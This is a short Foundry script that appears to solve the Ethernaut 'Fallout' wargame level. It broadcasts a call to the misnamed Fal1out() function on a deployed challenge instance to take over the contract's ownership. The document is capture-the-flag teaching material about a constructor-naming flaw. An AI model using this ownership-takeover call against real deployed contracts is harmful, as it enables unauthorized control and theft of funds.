pragma solidity ^0.6.0;

import {Fallout} from "../src/Fallout.sol";
import {Script} from "forge-std/Script.sol";

contract FallbackScript is Script {
    // instance id: 0x08735fa537C1Dbe96316C277F4B377cA671031b8
    Fallout public fallout = Fallout(payable(0x08735fa537C1Dbe96316C277F4B377cA671031b8));

    function setUp() public {
    }

    function run() public {
        vm.startBroadcast();
        fallout.Fal1out();
        vm.stopBroadcast();
    }
}